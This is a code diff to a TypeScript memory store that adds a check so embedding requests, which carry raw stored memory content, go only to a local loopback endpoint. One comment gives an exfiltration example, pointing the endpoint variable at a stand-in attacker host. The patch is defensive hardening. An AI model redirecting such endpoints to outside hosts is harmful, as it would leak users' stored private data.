@@ -13,6 +13,7 @@ import type Database from 'better-sqlite3';
 import { redactSecrets } from '../security/redaction.js';
 import { makeError, toRelayException } from '../errors.js';
 import { embedDocument as defaultEmbedDocument, type EmbeddingResult, type EmbedOptions } from './embedding-client.js';
+import { isLocalEndpoint } from './endpoint-locality.js';
 
 /**
  * PLAN-4 T2 — Signature of the injectable embedding client used for lazy
@@ -284,9 +285,23 @@ export class MemoryStore {
    *   - row deleted between INSERT and UPDATE → UPDATE hits zero rows (T-04-06).
    */
   private scheduleEmbed(memoryId: string, content: string): void {
+    // Capture model + endpoint NOW (at call site, before the microtask fires).
+    // If RELAY_EMBEDDING_MODEL changes between INSERT and the microtask, the
+    // row must record the model that was active at write time — otherwise the
+    // BLOB's vector space and the embedding_model column drift apart and
+    // cross-model rejection silently mis-classifies the row.
     const model = process.env['RELAY_EMBEDDING_MODEL'];
     if (!model) return; // feature off — no embed, no warning
     const endpoint = process.env['LMSTUDIO_ENDPOINT'] ?? 'http://127.0.0.1:1234';
+    // Locality gate — refuse to ship raw memory content to a non-loopback
+    // host. Setting LMSTUDIO_ENDPOINT=https://attacker.example.com would
+    // otherwise exfiltrate every remembered fact via /v1/embeddings. Skip
+    // silently (leaves blob NULL — recall falls through to word-overlap) but
+    // emit one deduped stderr warning so the operator notices.
+    if (!isLocalEndpoint(endpoint)) {
+      this.warnEmbedSkipped('non-local-endpoint');
+      return;
+    }
     // queueMicrotask (NOT setImmediate) — vitest/node:test microtask flush is
     // deterministic via a single Promise.resolve() tick, setImmediate would
     // race the test runner's task queue.
